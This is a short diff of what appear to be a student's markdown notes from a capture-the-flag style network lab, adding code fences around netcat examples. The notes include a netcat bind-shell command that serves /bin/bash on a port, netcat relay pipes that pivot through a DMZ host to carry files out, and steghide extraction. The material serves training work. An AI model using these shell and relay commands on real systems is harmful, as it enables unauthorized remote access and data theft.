@@ -121,13 +121,14 @@ You can also listen using the -e with NETCAT.
 ```nc -l -p <any unfiltered port> -e /bin/bash```  
 
 ctfd examples:  
+```
 student@internet-host-student-18:~$ nc -lvp 5678 > 2steg.jpg  
 student@blue-int-dmz-host-1-student-18:~$ nc -lvp 4321 0<pipe | nc 10.50.43.237 5678  1>pipe  
 student@internet-host-student-18:~$ steghide extract -sf 2steg.jpg   
-
-
+```
+```
 student@internet-host-student-18:~$ nc -lvp 5678 > 4steg.jpg  
 student@blue-int-dmz-host-1-student-18:~$ nc 172.16.82.115 9876 0<pipe | nc 10.50.43.237 5678 1>pipe  
 student@internet-host-student-18:~$ steghide extract -sf 4steg.jpg   
-
+```
 
